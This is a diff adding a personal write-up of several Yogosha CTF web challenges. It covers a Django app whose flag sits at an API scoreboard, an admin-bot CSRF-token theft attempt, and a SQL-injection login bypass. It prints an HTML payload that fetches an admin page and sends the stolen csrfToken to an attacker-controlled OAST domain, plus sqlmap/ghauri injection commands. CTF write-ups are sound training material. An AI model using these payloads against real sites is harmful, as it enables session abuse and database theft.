@@ -1,0 +1,117 @@
+# Game flag
+
+- The challenge gives a link 'yogogame.ctf.yogosha.com' and a zip file 'Chall.zip'
+- Navigate to the link and immediately received '403 error' response
+- Fuzzed for files and directories using gobuster and ffuf but to no avail. All responses were 403
+- Shifted my focus to the Chall.zip file
+- Unzip and retrieved the folder 'Chall'
+- In the 'Chall' folder, it seems to be a django project files and folders
+- run the 'manage.py' script: sudo python3 manage.py runserver
+- A local app hosted at localhost:8000
+- the local app initial response is different than the main domain provided with this challenge. I got 404 response
+- decided to fuzz for files and directories again using gobuster and ffuf but still, no avail. The only responses I was able to get were 404 and 500
+- decided to look in depth into the other files and folders in the 'Chall' folder earlier
+- noticed a docker-compose file
+- run: sudo docker-compose up and it ran a migration to the chall_web_1
+- the migration includes pulling static files, seeds the database and some other stuff
+- noticed there is a db.sqlite3 file
+- decided to look further into the data stored in the database
+- run sqlite3 db.sqlite3 -> .tables -> listed all the tables exist in the database -> check each one of them with 'select * from {table-name}'
+- came across the 'flag{F4K3_FL4G}' in cybergame_game
+- decided to fuzz the files in 'staticfiles' with the local app earlier to see if flag is hidden somewhere in the code, but no avail
+- looked into cybergame directory, the urls.py seems to be paths for the app
+- tried each one of them but unfortunately, got 404 error still
+- decided to look into the MegaGameCorp next, noticed the urlpatterns snippet in the urls.py: urlpatterns = [path('admin/', admin.site.urls), path('api/', include('cybergame.urls'))]
+- append /api/ to the earlier paths found in the cybergame directory but got 500 error for all the paths
+- decided to use curl instead and test each of the paths until came across the /api/scoreboard/ and found the flag in there
+
+Tools used for this challenge:
+- ffuf and gobuster for directory fuzzing
+- sqlite3 command utility to interact with the db.sqlite3 file
+- docker-compose command utility to setup the project locally
+- curl command utility to simulate HTTP request
+
+# Internal Tool flag
+- The challenge gives a link 'internaltool.ctf.yogosha.com' and a zip file 'web.zip'
+- Navigate to the link and welcomed with the home page
+- Multiple navigations includes: /task, /apiv1/private/install and /report
+- the "Install" button in /apiv1/private/install does not seem to work as I keep getting 404 response
+- the /report endpoint is interesting as it takes in an input (url) which will be interacted by "admin" on the backend
+- this already gives me a clue on what i need to achieve: host exploit and let "admin" interacts with it to get what i want
+- I used interactsh to generate a quick Out-Of-Band domain to test if my theory is correct, and proven right. My OOB domain received some dns interaction from the "admin"
+- but it was not clear yet on what I need the "admin" to do
+- shifted my focus to the web.zip file earlier
+- file 'seed.js', found the the 'PPC2024{f4k3_fl4g}' under the Notes section, which makes me immediately assumed that the real flag can be retrieved from /notes from the app
+- looked into index.js and I can see multiple routes, includes the routes for /notes
+- I tried to access /notes from the app but I just get redirected to '/'
+- looking back at the routes for notes, I can only access the /notes if my "userTeam" is non-zero value
+- I also noticed the routes for /register and /login, which I immediately tried for 'admin:admin' credentials on login but no avail
+- I registered my own account and tried to access the /notes again but no avail
+- looking back at the routes earlier, I also noticed a route for /api/teams/:teamId/addUser/:username but this route can only be used by "admins" with valid csrfToken
+- I tried anyway to send a POST request to the endpoint using my own user but was not successful
+- At this point, it is clear to me that the thing I need to achieve using the /report endpoint earlier is to steal the admin's csrfToken
+- I looked at the source code for each endpoints earlier and found the csrfToken is visible in the /apiv1/private/install path
+- If i can make an exploit that will force the admin to go the /apiv1/private/install and get the csrfToken from the source code, then sends it back to me, I can use that csrfToken to send the POST request to /api/teams/:teamId/addUser/:username to set my "userTeam" to non-zero value so that I can access the /notes, which I presumably where the real flag is
+- i wrote a simple exploit.html that will force the "admin" to make a GET request to /apiv1/private/install to get that csrfToken and then sends it back to me via Out-Of-Band technique.
+```
+<html>
+  <body>
+    <script>
+      fetch("https://internaltool.ctf.yogosha.com/apiv1/private/install?id=1", {
+        credentials: "include"
+      })
+        .then(response => response.text())
+        .then(data => {
+          let tokenMatch = data.match(/csrfToken" value="([a-f0-9]+)"/);
+          let token = tokenMatch ? tokenMatch[1] : "not_found";
+          sendToken(token);
+        })
+        .catch(error => sendToken("error: " + error));
+
+      function sendToken(token) {
+        fetch("https://cvbpbbkoeu18f7k4mo4gd5xksy18n66o3.oast.me/leak?token=" + encodeURIComponent(token), {
+          mode: "no-cors"
+        });
+      }
+    </script>
+  </body>
+</html>
+```
+- what the code will do is, when the "admin" interacts with my hosted payload, it will fetch the /apiv1/private/install endpoint and then the code will fetch the csrfToken value from the source code. Then it will send back the csrfToken to the OOB domain I controlled in the "?token="" parameter
+- I hosted my exploit.html using github pages
+- go to /report page and submit the hosted url that contains my payload. Also ran my interactsh on the background to capture the dns & http interactions
+- wait for a couple seconds and my OOB received the dns & http interactions
+- but unfortunately, the csrfToken was not included in the "?token=" parameter as this is what I received instead: "?token=error%3A%20TypeError%3A%20Failed%20to%20fetch"
+- I kept modifying the exploit.html as I thought maybe I made mistakes with the exploit.html code but I keep getting the same response in the "?token=" parameter
+- Unfortunately, for this challenge, I was not able to retrieve the real flag
+
+Tools used in this challenge:
+- interactsh
+- github pages to host the exploit.html
+
+# FilteredOut flag
+- the challenge gives a url 'filteredout.ctf.yogosha.com' and file 'index.php'
+- navigating to the main url, i was welcomed with "wrong !"
+- I immediately thought maybe it is expecting parameters for credentials
+- Took a look at index.php and I was right, the parameters are 'user' & 'pass'
+- in the index.php, it also shows that if the credentials are right, the response would be different. Here i thought maybe the flag is visible once I successfully authenticate
+- unfortunately, there didn't seem like endpoints for /register so I assumed the challenge for this flag is to achieve sqli
+- in the 'pass' parameter, I supplied basic sqli payload: 'OR'1'='1 and I got the "Welcome \0/" response but the flag was not there
+- I immediately thought that the flag must be in the database and I need to figure out how I can access the database
+- I spray the 'pass' parameter with common sqli payloads but most of them fails, for the ones successful, I wasn't able to do much with it
+- So I used ghauri and sqlmap to help automate the exploitation phase. ghauri -u "https://filteredout.ctf.yogosha.com/index.php?user=admin&pass=test'or'1'='1" --dbms=mysql --batch --dbs -p pass --level=3 || sqlmap -u "https://filteredout.ctf.yogosha.com/index.php?user=admin&pass=1'or'1'='1" --level=5 --risk=3 --dbs --batch --dbms=mysql --random-agent
+- i specifically specified the mysql dbms as I saw the mysql syntax in the index.php file
+- unfortunately, both of the tools were not able to achieve the exploitation
+- I kept trying tailoring my sqli payload but to no avail
+- unfortunately for this challenge, i was not able to retrieve the real flag
+
+Tools used in this challenge:
+- sqli & ghauri
+
+# Blog flag
+- the challenge gives a url 'https://blog.ctf.yogosha.com'
+- unfortunately, the site was down for quite some time until there was only couple hours left until the ctf ends
+- I din't get to do much for this challenge so I skipped this one
+
+
+flag{b1fc78e713dfb0d862a1292a9688b0e7a7095fcc} game flag
